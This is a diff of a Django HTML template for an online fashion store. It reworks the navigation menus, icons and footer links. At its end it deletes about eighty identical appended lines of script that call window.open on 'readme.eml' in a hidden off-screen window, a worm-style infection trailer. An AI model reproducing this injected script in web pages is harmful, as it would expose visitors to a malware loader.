@@ -16,8 +16,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 
     <!-- CSS Link -->
-
-    <link href="{% static 'css/style.css' %}" rel="stylesheet">
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
     <!-- <link rel="stylesheet" href="/css/myOrders.css"> -->
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
@@ -47,17 +46,120 @@
         <!--************** MAIN NAVBAR SECTION***************** -->
 
         <nav class="main_navbar">
-            <ul>
+            <ul class="navbars">
                 <div class="navbrand_logo">
                     <a class="fashion_category active" data-rel="#content-d" href="/index.html">
                         <img src="{% static 'images/DXD_synergy_logo.jpg' %}" alt="">
                     </a>
                 </div>
 
-                <li class="women_section" ><a class="fashion_category" data-rel="#content-e"
-                        href="{% url 'orders:order_create' %}">WOMEN</a></li>
-                <li class="men_section"><a class="fashion_category" data-rel="#content-f"
-                        href="">MEN</a></li>
+                <li class="women_section dropdowns">
+                    
+                    <a class="fashion_category dropbtns" data-rel="#content-e"
+                        href="/sub_category/women.html">WOMEN
+                    </a>
+
+                    
+                    <div class="dropdown-contents">
+                        <!-- <div class="headers">
+                          <h2>Mega Menu</h2>
+                        </div>    -->
+                        <div class="rows">
+                            <div class="columns">
+                              <!-- <h5>Shoes</h5> -->
+                           <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                            
+                              
+                            </div>
+                            <div class="columns">
+                              <h5><a href="" class="">Shoes</a></h5>
+                              <a href="#">Sneakers</a>
+                              <a href="#">Sneakers</a>
+                              <a href="#">Sneakers</a>
+                              <a href="#">Sneakers</a>
+                              <a href="#">Sneakers</a>
+                            </div>
+                            <div class="columns">
+                                <h5><a href="" class="">Clothing</a></h5>
+                              <a href="#">T-shirts</a>
+                              <a href="#">T-shirts</a>
+                              <a href="#">T-shirts</a>
+                              <a href="#">T-shirts</a>
+                              <a href="#">T-shirts</a>
+                            </div>
+                            <div class="columns">
+                              <h5><a href="">Accessories</a></h5>
+                              <a href="#">Wristwatch</a>
+                              <a href="#">Wristwatch</a>
+                              <a href="#">Wristwatch</a>
+                              <a href="#">Wristwatch</a>
+                              <a href="#">Wristwatch</a>
+                              
+                            </div>
+                          </div>
+                      </div>
+
+
+                    </li>
+
+                <li class="men_section dropdowns ">
+                    <a class="fashion_category dropbtns" data-rel="#content-f"
+                        href="/sub_category/men.html">MEN
+                    </a>
+
+                    <div class="dropdown-contents">
+                        <!-- <div class="headers">
+                          <h2>Mega Menu</h2>
+                        </div>    -->
+                        <div class="rows">
+                            <div class="columns">
+                              <!-- <h5>Shoes</h5> -->
+                            <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                           <h6><a href="">New Arrivals</a></h6>
+                            
+                              
+                              
+                            </div>
+                            <div class="columns">
+                              <h5><a href="" class="">Shoes</a></h5>
+                              <a href="#">Sneakers</a>
+                              <a href="#">Sneakers</a>
+                              <a href="#">Sneakers</a>
+                              <a href="#">Sneakers</a>
+                              <a href="#">Sneakers</a>
+                            </div>
+                            <div class="columns">
+                                <h5><a href="" class="">Clothing</a></h5>
+                              <a href="#">T-shirts</a>
+                              <a href="#">T-shirts</a>
+                              <a href="#">T-shirts</a>
+                              <a href="#">T-shirts</a>
+                              <a href="#">T-shirts</a>
+                            </div>
+                            <div class="columns">
+                              <h5><a href="">Accessories</a></h5>
+                              <a href="#">Wristwatch</a>
+                              <a href="#">Wristwatch</a>
+                              <a href="#">Wristwatch</a>
+                              <a href="#">Wristwatch</a>
+                              <a href="#">Wristwatch</a>
+                              
+                            </div>
+                          </div>
+                      </div>
+
+
+
+                    </li>
                
                 <form action="" class="py-2 form1">
                     <div class="form-group input_field_area mb-0">
@@ -67,15 +169,21 @@
                     </div>
                 </form>
 
-                <li class="li_user_icon">
-                    <a href="/myAccount.html" class="empty_face">
+                <!-- <li class="li_user_icon">
+                    <a href="/pages/myAccount.html" class="empty_face">
                         <i class="fa fa-user user_icon" aria-hidden="true"></i>
+                    </a>
+                </li> -->
+
+                <li class="li_suitcase pr-3">
+                    <a href="/pages/shopping.html">
+                        <i class="fa fa-cart-plus checkout_suitcase" aria-hidden="true"></i>
                     </a>
                 </li>
 
                 <li class="li_suitcase">
-                    <a href="{% url 'orders:order_create' %}">
-                        <i class="fa fa-cart-plus checkout_suitcase" aria-hidden="true"></i>
+                    <a href="/pages/myOrders.html">
+                        <i class="fa fa-shopping-bag checkout_suitcase" aria-hidden="true"></i>
                         <!-- <img src="/images/suitcase.jpg" alt="" class="checkout_suitcase"> -->
                     </a>
                 </li>
@@ -86,7 +194,7 @@
 
         <!-- *****************SIDEBAR SECTION************************ -->
 
-        <div class="sidebar">
+        <div class="sidebar" id="home">
             <input type="checkbox" id="click">
             <label for="click" class="togglebar">
                 <i class="fa fa-bars" aria-hidden="true"></i>
@@ -95,9 +203,10 @@
 
             <ul>
                 <div class="toggle_button_container">
-                    <li class="li_women">
+                    <li class="li_women ">
                         <button class="button active" data-rel="#content-a"
-                            href="/sub_category/women.html">WOMEN</button>
+                            href="/sub_category/women.html">WOMEN
+                        </button>
                     </li>
                     <li class="li_men">
                         <button class="button" data-rel="#content-b" href="/sub_category/men.html">MEN</button>
@@ -182,23 +291,23 @@
         <!--********************** HERO SECTION   *************************** -->
 
         <div id="content-d" class="category">
-            <nav class="sub_category">
+            <div class="sub_category">
                 <ul>
-                    <li class="">
+                    <!-- <li class="">
                         <a class="fashion_category" data-rel="#content-e" href="/sub_category/women.html">WOMEN</a>
-                    </li>
+                    </li> -->
 
                     <li>
-                        <h5 href="">
+                        <h4 href="">
                             25% OFF EVERYTHING!* <br>
                             <span>With code: WOO25</span>
-                        </h6>
+                        </h4>
                     </li>
-                    <li>
+                    <!-- <li>
                         <a class="fashion_category" data-rel="#content-f" href="/sub_category/men.html">MEN</a>
-                    </li>
+                    </li> -->
                 </ul>
-            </nav>
+            </div>
 
             <section>
                 <div class="hero_section">
@@ -210,7 +319,7 @@
                             <button class="shop_men_button fashion_category mb-3" data-rel="#content-f">SHOP MEN</button>
                         </div>
                     </div>
-                    <div class="bg-dark bottom_hero_section">
+                    <div class="bottom_hero_section">
                         <p class="mb-0">EASY DELIVERY WORLDWIDE</p>
                         <p class="mb-0">DISCOVER OVER 850 BRANDS</p>
                     </div>
@@ -220,6 +329,7 @@
         </div>
 
         <!-- /****************  WOMEN FASHION SECTION ****************** */ -->
+
         <div id="content-e" class="category">
             <div class="outlet_discount_women">
                 <h2>OUTLET</h2>
@@ -251,7 +361,7 @@
                 </div>
                 <div>
                     <div>
-                        <img src="{% static 'images/topwomen_img.jpg' %}" alt="">
+                        <img src="/{% static 'images/topwomen_img.jpg' %}" alt="">
                     </div>
                      <h6>ADIDAS ORIGINAL</h6>
                     <p>3 stripes and you're in</p>
@@ -431,9 +541,9 @@
         <footer>
             <div class="icons_and_images">
                 <ul class="font_awesome_icons">
-                    <a href="https://www.facebook.com/dxdsynergy/"><i class="fa fa-facebook-official facebook_icon" aria-hidden="true"></i></a>
-                    <a href="https://instagram.com/dxd_synergy_?igshid=YmMyMTA2M2Y="><i class="fa fa-instagram instagram_icon" aria-hidden="true"></i></a>
-                    <a href="https://twitter.com/dxd_synergy_?s=11&t=w9CXZKFEdoyQqjaVjFaPWw"><i class="fa fa-twitter twitter_icon" aria-hidden="true"></i></a>
+                    <a href=""><i class="fa fa-facebook-official facebook_icon" aria-hidden="true"></i></a>
+                    <a href=""><i class="fa fa-instagram instagram_icon" aria-hidden="true"></i></a>
+                    <a href=""><i class="fa fa-snapchat-ghost snapchat_icon" aria-hidden="true"></i></a>
                 </ul>
 
                 <ul class="electronic_images">
@@ -526,88 +636,9 @@
         crossorigin="anonymous"></script>
 
     <!-- JAVASCRIPT LINK -->
-    <script type="text/javascript" src="{% static 'js/main.js' %}"></script>
+    <script src="{% static 'js/main.js' %}"></script>
     <!-- <script async src="//jsfiddle.net/wyEq7/embed/"></script> -->
 
 </body>
 
 </html>
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
-<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
